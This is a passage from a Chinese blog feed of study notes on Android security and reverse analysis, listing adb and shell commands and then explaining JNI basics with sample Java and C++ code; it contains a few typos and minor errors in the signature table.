&lt;p&gt;​   用法：adb shell dump dbnfo [packagename]&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180716123331.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;h5 id=&#34;2-5-adb-install&#34;&gt;2.5 adb install&lt;/h5&gt;

&lt;p&gt;​   说明：安装应用包apk文件&lt;/p&gt;

&lt;p&gt;​   用法：adb install [apk文件]&lt;/p&gt;

&lt;p&gt;​   升级安装 使用apk install -r [apk文件]&lt;/p&gt;

&lt;h5 id=&#34;2-6-adb-uninstall&#34;&gt;2.6 adb uninstall&lt;/h5&gt;

&lt;p&gt;​   卸载&lt;/p&gt;

&lt;h5 id=&#34;2-7-adb-pull&#34;&gt;2.7 adb pull&lt;/h5&gt;

&lt;p&gt;​   从设备复制到本地&lt;/p&gt;

&lt;p&gt;​   adb pull 设备目录 本地目录&lt;/p&gt;

&lt;h5 id=&#34;2-8-adb-push&#34;&gt;2.8 adb push&lt;/h5&gt;

&lt;p&gt;​   从本地复制到设备&lt;/p&gt;

&lt;p&gt;​   同上&lt;/p&gt;

&lt;h5 id=&#34;2-9-adb-shell-screencap&#34;&gt;2.9 adb shell screencap&lt;/h5&gt;

&lt;p&gt;​   截屏&lt;/p&gt;

&lt;p&gt;​   adb shell scteencap -p 截图文件目录&lt;/p&gt;

&lt;p&gt;​   快速截取手机屏幕&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bat&#34;&gt;adb shell screencap -p /sdcard/tmp.png
adb pull /sdcard/tmp.png D:\
start D:\tmp.png
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;2-10-adb-shell-screenrecord&#34;&gt;2.10 adb shell screenrecord&lt;/h5&gt;

&lt;p&gt;​   录屏&lt;/p&gt;

&lt;p&gt;​   adb shell screenrecord 路径&lt;/p&gt;

&lt;h5 id=&#34;2-11-adb-shell-input-text&#34;&gt;2.11 adb shell input text&lt;/h5&gt;

&lt;p&gt;​   输入文本内容&lt;/p&gt;

&lt;p&gt;​   adb shell input text [需要输入文本框的内容]&lt;/p&gt;

&lt;p&gt;​   eg: 让输入内容的文本框回去焦点&lt;/p&gt;

&lt;p&gt;​   &lt;code&gt;adb shell input text &#39;hello world&#39;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;​   这个命令可以模拟物理键盘、虚拟键盘、滑动、滚动等事件。&lt;/p&gt;

&lt;h5 id=&#34;2-12-adb-forward&#34;&gt;2.12 adb forward&lt;/h5&gt;

&lt;p&gt;​   端口转发命令&lt;/p&gt;

&lt;p&gt;​   adb forward  [远程协议：端口号]· [设备协议：端口号 ]&lt;/p&gt;

&lt;p&gt;​   eg: adb forward tcp:23946 tcp:23946  IDA 调试&lt;/p&gt;

&lt;p&gt;​         adb  forwrd tcp:8700 jwdp:1786&lt;/p&gt;

&lt;h5 id=&#34;2-13-adb-jdwp&#34;&gt;2.13 adb jdwp&lt;/h5&gt;

&lt;p&gt;​   查看设备中可以被调试的应用的进程号&lt;/p&gt;

&lt;p&gt;​   adb jdwp&lt;/p&gt;

&lt;h5 id=&#34;2-14-adb-logcat&#34;&gt;2.14 adb logcat&lt;/h5&gt;

&lt;p&gt;​   查看当前的日志信息&lt;/p&gt;

&lt;p&gt;​   adb logcat -s tag    eg：&lt;code&gt;adb logcat -s fb&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;​   adb logcat | findstr pname/pip/keyword&lt;/p&gt;

&lt;p&gt;​   adb logcat | findstr 包&lt;/p&gt;

&lt;p&gt;​   日志信息过滤&lt;/p&gt;

&lt;h4 id=&#34;3-shell-命令&#34;&gt;3. shell 命令&lt;/h4&gt;

&lt;p&gt;这儿shell命令是指先运行adb shell 再执行命令 与非shell命令互通&lt;/p&gt;

&lt;h5 id=&#34;3-1-run-as&#34;&gt;3.1 run-as&lt;/h5&gt;

&lt;p&gt;​   在非root设备中查看指定debug模式的包名应用沙盒数据&lt;/p&gt;

&lt;p&gt;​   run-as [package name]&lt;/p&gt;

&lt;h5 id=&#34;3-2-ps&#34;&gt;3.2 ps&lt;/h5&gt;

&lt;p&gt;​   查看设备进程信息或者指定进程的线程信息&lt;/p&gt;

&lt;p&gt;​   ps | grep 过滤内容&lt;/p&gt;

&lt;p&gt;​   ps -t [pid] 查看pid 对应的线程信息&lt;/p&gt;

&lt;p&gt;​&lt;/p&gt;

&lt;h5 id=&#34;3-3-pm-clear&#34;&gt;3.3 pm clear&lt;/h5&gt;

&lt;p&gt;​   清空指定包名的应用数据&lt;/p&gt;

&lt;p&gt;​   pm clear [packagename]&lt;/p&gt;

&lt;h5 id=&#34;3-4-pm-install&#34;&gt;3.4 pm install&lt;/h5&gt;

&lt;p&gt;​   安装设备中的apk 同adb install&lt;/p&gt;

&lt;h5 id=&#34;3-5-pm-uninstall&#34;&gt;3.5 pm uninstall&lt;/h5&gt;

&lt;p&gt;​   卸载&lt;/p&gt;

&lt;h5 id=&#34;3-6-am-start&#34;&gt;3.6 am start&lt;/h5&gt;

&lt;p&gt;​   启动一个应用&lt;/p&gt;

&lt;p&gt;​   am start -n [packname]/[packname].[activity name]&lt;/p&gt;

&lt;p&gt;​   am start -D -n    (以debug方式启动)&lt;/p&gt;

&lt;h5 id=&#34;3-7-am-startservice&#34;&gt;3.7 am startservice&lt;/h5&gt;

&lt;p&gt;​   启动一个服务&lt;/p&gt;

&lt;p&gt;​   am startservice -n [packagename]/[package name].[service name]&lt;/p&gt;

&lt;h5 id=&#34;3-8-am-broadcast&#34;&gt;3.8 am broadcast&lt;/h5&gt;

&lt;p&gt;​   发送一个广播&lt;/p&gt;

&lt;p&gt;​   am broadcast -a [广播动作]&lt;/p&gt;

&lt;h5 id=&#34;3-9-netcfg&#34;&gt;3.9 netcfg&lt;/h5&gt;

&lt;p&gt;​   查看设备的ip地址&lt;/p&gt;

&lt;h5 id=&#34;3-10-netstat&#34;&gt;3.10 netstat&lt;/h5&gt;

&lt;p&gt;​   查看设备的端口号信息&lt;/p&gt;

&lt;h5 id=&#34;3-11-app-process&#34;&gt;3.11 app_process&lt;/h5&gt;

&lt;p&gt;​   运行java代码&lt;/p&gt;

&lt;p&gt;​   app_process [运行代码目录]· [运行主类]&lt;/p&gt;

&lt;p&gt;​   eg:&lt;/p&gt;

&lt;p&gt;​   &lt;code&gt;export CLASSPATH = /data/demo.jar&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;​   &lt;code&gt;exec /system/bin/app_process /data/cn.wdasdkl.Main&lt;/code&gt;&lt;/p&gt;

&lt;h5 id=&#34;3-12-dalvikvm&#34;&gt;3.12 dalvikvm&lt;/h5&gt;

&lt;p&gt;​   运行dex文件&lt;/p&gt;

&lt;p&gt;​   dalvikvm -cp [dex文件] · [运行主类]&lt;/p&gt;

&lt;p&gt;​   差不多同上的用处&lt;/p&gt;

&lt;h5 id=&#34;3-13-top&#34;&gt;3.13 top&lt;/h5&gt;

&lt;p&gt;​   查看当前应用CPU的消耗信息。&lt;/p&gt;

&lt;p&gt;​   top [-n/-m/-d/-s/-t]&lt;/p&gt;

&lt;p&gt;​   -m 最多显示多少个进程&lt;/p&gt;

&lt;p&gt;​   -n 刷新次数&lt;/p&gt;

&lt;p&gt;​   -d 刷新时间间隔&lt;/p&gt;

&lt;p&gt;​   -s 按那一列排序&lt;/p&gt;

&lt;p&gt;​   -t 显示线程信息而不是进程&lt;/p&gt;

&lt;h5 id=&#34;3-14-getprop&#34;&gt;3.14 getprop&lt;/h5&gt;

&lt;p&gt;​   查看系统属性&lt;/p&gt;

&lt;p&gt;​   getprop [属性值名称]&lt;/p&gt;

&lt;p&gt;​   eg：&lt;code&gt;getprop ro.debuggable&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;​   查看设备的信息&lt;/p&gt;

&lt;h4 id=&#34;4-操作apk-命令&#34;&gt;4 操作apk 命令&lt;/h4&gt;

&lt;h5 id=&#34;4-1-用aapt-命令操作apk命令&#34;&gt;4.1 用aapt 命令操作apk命令&lt;/h5&gt;

&lt;p&gt;​   查看apk中的信息以及编辑apk程序包&lt;/p&gt;

&lt;p&gt;​   aapt dump xmltree [apk包] · [需要查看的资源文件]&lt;/p&gt;

&lt;p&gt;​   eg：&lt;code&gt;aapt dump xmltree demp.apk AndroidManifest.xml&lt;/code&gt;&lt;/p&gt;

&lt;h5 id=&#34;4-2-用dexdump-操作dex-命令&#34;&gt;4.2 用dexdump 操作dex 命令&lt;/h5&gt;

&lt;p&gt;​   查看dex的详细信息&lt;/p&gt;

&lt;p&gt;​   dexdump [dex文件路径]&lt;/p&gt;

&lt;h4 id=&#34;5-进程命令&#34;&gt;5 进程命令&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;##### 5.1 查看当前进程的内存加载情况
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;​   cat  proc/[pid]/maps   查看当前进程的内存映射信息，比如加载了那些so文件，dex文件等等。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180716134420.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;h5 id=&#34;5-2-查看进程的状态信息&#34;&gt;5.2 查看进程的状态信息&lt;/h5&gt;

&lt;p&gt;​   cat /proc/[pid]/status&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180716134609.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;h5 id=&#34;5-3-查看当前应用使用的端口号信息&#34;&gt;5.3 查看当前应用使用的端口号信息&lt;/h5&gt;

&lt;p&gt;​   cat /proc /[pid] / net /     tcp/ tcp6 /udp /udp6&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180716134826.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;总结&#34;&gt;总结&lt;/h3&gt;

&lt;p&gt;​   这章就是一些会用到的命令，后面的学习必不可少的知识点。&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title>Android应用安全防护和逆向分析 基础篇②</title>
      <link>https://naivete.cc/post/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%872/</link>
      <pubDate>Fri, 13 Jul 2018 15:01:09 +0800</pubDate>
      
      <guid>https://naivete.cc/post/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%872/</guid>
      
        <description>

&lt;h1 id=&#34;一-基础篇②&#34;&gt;一、 基础篇②&lt;/h1&gt;

&lt;h2 id=&#34;第二章-android中ndk的开发&#34;&gt;第二章 Android中NDK的开发&lt;/h2&gt;

&lt;h3 id=&#34;1-相关环境&#34;&gt;1.  相关环境&lt;/h3&gt;

&lt;p&gt;相关环境参考另外一篇文章&lt;a href=&#34;https://naivete.cc/post/android%E5%AE%89%E5%85%A8%E5%92%8C%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/&#34;&gt;Android安全和开发环境搭建&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&#34;2-jni基础&#34;&gt;2.  JNI基础&lt;/h3&gt;

&lt;h4 id=&#34;2-1-第一行代码-书上使用eclipse-我使用as-简单方便很多&#34;&gt;2.1 第一行代码(书上使用Eclipse,我使用AS(简单方便很多))&lt;/h4&gt;

&lt;p&gt;​   参考文章&lt;a href=&#34;https://naivete.cc/post/android%E5%AE%89%E5%85%A8%E5%92%8C%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/&#34;&gt;Android安全和开发环境搭建&lt;/a&gt;中的JNI开发章节&lt;/p&gt;

&lt;h4 id=&#34;2-2-jnienv类型和jobject类型&#34;&gt;2.2  JNIEnv类型和jobject类型&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;AS 默认自动生成&lt;/strong&gt;&lt;br /&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&#34;language-JAVA&#34;&gt; public native String stringFromJNI();
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;Java_com_naivete_jni_1study_MainActivity_stringFromJNI(
        JNIEnv *env,
        jobject /* this */) {
    std::string hello = &amp;quot;Hello from C++&amp;quot;;
    return env-&amp;gt;NewStringUTF(hello.c_str());
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;JNIEnv类型&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;通过JNIEnv* 指针就可以对Java端的代码进行操作&lt;/p&gt;

&lt;p&gt;Jni的所有函数可以查看jni.h文件&lt;/p&gt;

&lt;p&gt;下面是一些函数eg：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;NewObject : 创建Java类中的对象。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;NewString : 创建Java类中的String对象。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;New&lt;Type&gt;Array : 创建类型为Type的数组对象&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Get&lt;Type&gt;Field: 获取型为Type的字段。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Set&lt;Type&gt;Fileld: 设置类型为Type的字段的值。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;GetStatic&lt;Type&gt;Field: 获取类型为Type的static的字段。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;SetStatic&lt;Type&gt;Field:设置类型为Typede的static的字段的值。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Call&lt;type&gt;Method: 调用返回类型为Type的方法。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;CallStatic&lt;Type&gt;Method: 调用返回值类型为Type的Static方法&lt;/p&gt;

&lt;p&gt;&amp;hellip;..&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;strong&gt;Jobject参数obj&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;如果native 方法不是static ,obj就代表native方法的实例。&lt;/p&gt;

&lt;p&gt;如果narive方法是static,obj 就代表native方法的类的class对象实例。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Java和C++中的基本类型的映射关系&lt;/strong&gt;：&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;具体查看jni.h文件的详细说明&lt;/p&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;center&#34;&gt;Java类型&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;本地类型&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;JNI定义的别名&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;

&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;int&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;long&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;jint/jsize&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;long&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;_int64&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;jlong&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;byte&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;signed char&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;jbyte&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;boolean&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;unsigned char&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;jboolean&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;char&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;unsigned short&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;jchar&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;short&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;short&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;jshort&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;float&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;float&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;jfloat&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;double&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;double&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;jdouble&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;Object&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;_jobject*&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;jobject&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;jclass类型&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;jclass 表示java中的class 类：&lt;/p&gt;

&lt;p&gt;JNIEnv 类中有如下几个简单的函数可以取得jclass:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;jclass FindClass( const char* clsName):通过类的名称来获取jclass&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;jcalss GetObjectClass( jobject obj ):通过对象实例来获取jcalss,相当于java 中的getclass方法&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;jclass GetSuperClass(jclass obj):通过jclass 可以获取其父类的jclass对象。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;strong&gt;native中访问Java层代码&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;常见的应用就是获取类的属性和调用类的方法&lt;/p&gt;

&lt;p&gt;JNi在jni.h头文件中定义了jfieldId、jmethodID类型分别代表JAVA端的属性和方法。&lt;/p&gt;

&lt;p&gt;使用JNI的以下方法来取得相应的jfieldId、jmethodID：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;GetFieldID、GetMethodID&lt;/li&gt;
&lt;li&gt;GetStaticFieldID、GetStaticMethodID&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;查看jni.h中源函数&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt; GetFieldID(jclass clazz, const char* name, const char* sig)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;​   参数说明：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;clazz 方法依赖的类对象的class对象&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;name: 字段的名称&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;sig : 字段的签名&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;查看签名命令&lt;/p&gt;

&lt;p&gt;&lt;code&gt;javap -s -p 字节码.class 文件&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;GetMethodID 也能够会的构造函数的jmethodID，创建一个Java对象是可以调用指定的构造方法，eg：&lt;/p&gt;

&lt;p&gt;&lt;code&gt;env-&amp;gt;GetmethodID(data_class,&amp;quot;&amp;lt;init&amp;gt;&amp;quot;,&amp;quot;()v&amp;quot;);&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;签名的格式：&lt;/p&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;center&#34;&gt;类型&lt;/th&gt;
&lt;th&gt;相应的签名&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;

&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;boolean&lt;/td&gt;
&lt;td&gt;Z&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;byte&lt;/td&gt;
&lt;td&gt;B&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;chat&lt;/td&gt;
&lt;td&gt;C&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;short&lt;/td&gt;
&lt;td&gt;S&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;int&lt;/td&gt;
&lt;td&gt;I&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;long&lt;/td&gt;
&lt;td&gt;L&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;float&lt;/td&gt;
&lt;td&gt;F&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;double&lt;/td&gt;
&lt;td&gt;D&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;void&lt;/td&gt;
&lt;td&gt;V&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;object&lt;/td&gt;
&lt;td&gt;L用/分割包的完整类名；Ljava/lang/String;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;Array&lt;/td&gt;
&lt;td&gt;[签名 [I [Ljava/lang/Object&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;Method&lt;/td&gt;
&lt;td&gt;(参数类型签名··· .) 返回值类型签名&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;eg:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;package com.naivete.jni_study;

import java.util.Date;

public class Hello {
    public int property;
    public int function(int foo, Date date,int[] arr){
        System.out.println(&amp;quot;function&amp;quot;);
        return 0;
    }

    public native void test();
}
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-C++&#34;&gt;extern &amp;quot;C&amp;quot;
JNIEXPORT void JNICALL
Java_com_naivete_jni_1study_Hello_test(JNIEnv *env, jobject instance) {

    // TODO
    jclass helloclazz = env-&amp;gt;GetObjectClass(instance);
    jfieldID field_prop = env-&amp;gt;GetFieldID(helloclazz,&amp;quot;property&amp;quot;,&amp;quot;I&amp;quot;);   //取到property字段
    jmethodID method_fun = env-&amp;gt;GetMethodID(helloclazz,&amp;quot;function&amp;quot;,&amp;quot;ILjava/util/Date;[I)I&amp;quot;); //取到function函数
    env-&amp;gt;CallIntMethod(instance,method_fun,0L,NULL,NULL);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;GetStaticFieldID与GetStaticMethodID这两个方法的用法大同小异。&lt;/p&gt;

&lt;h4 id=&#34;2-3-jnienv类型中方法的使用&#34;&gt;2.3 JNIEnv类型中方法的使用&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;在java中定义一个属性，再从C++代码中将其设置成另外的值&lt;/li&gt;
&lt;/ul&gt;

&lt;h5 id=&#34;2-3-1-native中获取方法的id&#34;&gt;2.3.1 native中获取方法的ID&lt;/h5&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;       private static String TAG = &amp;quot;Hello&amp;quot;;
       public int number = 0;
       public native void sayHello();
   
       public static void main() {
           Hello hello = new Hello();
           hello.sayHello();
           System.out.print(hello.number);
           Log.d(TAG, &amp;quot;&amp;quot;+hello.number);
       }
   }
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-C++&#34;&gt;   JNIEXPORT void JNICALL
   Java_com_naivete_jni_1study_Hello_sayHello(JNIEnv *env, jobject instance) {
   
       // TODO
       jclass helloclazz = env-&amp;gt;GetObjectClass(instance);
       jfieldID id_number = env-&amp;gt;GetFieldID(helloclazz,&amp;quot;number&amp;quot;,&amp;quot;I&amp;quot;); //获取numberID
       jint number = env-&amp;gt;GetIntField(instance,id_number); //获取number的值;
       cout&amp;lt;&amp;lt;number&amp;lt;&amp;lt;endl;  //输出到控制台
       env-&amp;gt;SetIntField(instance,id_number,100L); //设置number的值;注意jint对应c++ long类型
   }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/android-note-2-1.png&#34; alt=&#34;1&#34; /&gt;&lt;/p&gt;

&lt;p&gt;JNIEnv 还提供了许多Call&lt;Type&gt;Method 和CallStatic&lt;Type&gt;Method 还有CallNovirtual&lt;Type&gt;Method函数，需要通过GetMethodID来取得相应的方法的jmethodId传入到上述函数的参数中&lt;/p&gt;

&lt;p&gt;调用示例方法的三种形式如下：&lt;/p&gt;

&lt;p&gt;&lt;code&gt;Call&amp;lt;Type&amp;gt;Method(jobject obj,jmethodID id,id,·······);&lt;/code&gt; //常用的方式&lt;/p&gt;

&lt;p&gt;&lt;code&gt;Call&amp;lt;Type&amp;gt;Method(jobject obj,jmethodID id,id,va_list lst);&lt;/code&gt; //有指向参数表的va_list变量（很少使用）&lt;/p&gt;

&lt;p&gt;&lt;code&gt;Call&amp;lt;Type&amp;gt;Method(jobject obj,jmethodID id,id,jvalue * v);&lt;/code&gt; //有指向jvalue或jvalue数组指针时用的&lt;/p&gt;

&lt;p&gt;jvalue 是union联合体，定义jvalue数组传递到方法中，这样可以包含多种类型的参数：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;   typedef union jvalue{
       jboolean z;
       jbytpe   b;
       jchar    c;
       jshort   s;
       jint     i;
       jlong    j;
       jfloat   f;
       jdouble  d;
       jobject  l;
   }jvalue;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;比如在Java中有这样一个方法：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   boolean function(int a,double b,char c){
   
   ·····
   
   }
   
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;1）在C++中使用第一种方法调用function方法：&lt;/p&gt;

&lt;p&gt;&lt;code&gt;env-&amp;gt;CallbooleanMethod(obj,id_function,10L，3.4，L&#39;a&#39;)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;obj:functon对象，id_function:functiond的id,10L、3.4、L&amp;rsquo;a&amp;rsquo;是对应的参数。&lt;/p&gt;

&lt;p&gt;L&amp;rsquo;a&amp;rsquo; 中的L是因为Java中的字符是Unicode双字节的，而C++中的字节是单字节的，所以要变成宽字符。&lt;/p&gt;

&lt;p&gt;2）在C++中使用第三种方法function调用：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-C++&#34;&gt;   jvalue* args = new Jvalue[3]
   args[0] = 10L;
   args[1] = 3.22;
   args[2] = L&#39;a&#39;;
   env-&amp;gt;GetBooleanMethod(obj,id_function,args);
   delete[] args;  //是否指针堆内存
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;2-3-2-java和c-中的多态机制&#34;&gt;2.3.2 Java和C++中的多态机制&lt;/h5&gt;

&lt;p&gt;JNIEnv中的特殊方法CallNovirtual&lt;type&gt;Method。来帮助java调用Java中父类的方法。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;介绍了-C++和java多态的基础知识。&lt;/li&gt;
&lt;li&gt;步骤：

&lt;ul&gt;
&lt;li&gt;获取obj中对象的class 对象 GetObjectClass(obj)&lt;/li&gt;
&lt;li&gt;获取java中father字段的id GetFieldID()&lt;/li&gt;
&lt;li&gt;获取father字段的对象类型 GetObjectField&lt;/li&gt;
&lt;li&gt;获取father对象的class对象 FindClass&lt;/li&gt;
&lt;li&gt;获取father对象中function方法ID GetMethodID()&lt;/li&gt;
&lt;li&gt;调用父类中的function方法（会执行子类的方法）CallvoidMethod&lt;/li&gt;
&lt;li&gt;调用父类中的function方法（会执行父类的方法）CallNonvirtualVoidMethod()&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;2-4-创建java对象及字符串的操作方法&#34;&gt;2.4 创建Java对象及字符串的操作方法&lt;/h4&gt;

&lt;h5 id=&#34;2-4-1-native中创建java对象&#34;&gt;2.4.1 native中创建Java对象&lt;/h5&gt;

&lt;p&gt;​   两种方法：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;第一种：&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code&gt;jobject Newobject(jclass clazz,jmethodID methodID,·····)&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;clazz 需要创建的Java对象的Class对象。&lt;/li&gt;
&lt;li&gt;methodID :传递一个方法的ID: 构造方法&lt;/li&gt;
&lt;li&gt;第三个参数：构造函数需要传入的参数值（默认不传递） 默认构造方法返回值签名始终是&amp;rdquo;()V&amp;rdquo;,方法的名称始终是&amp;rdquo;&lt;init&gt;&amp;ldquo;。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;在C++中构造Java中的Date对象调用方法getTime():&lt;/p&gt;

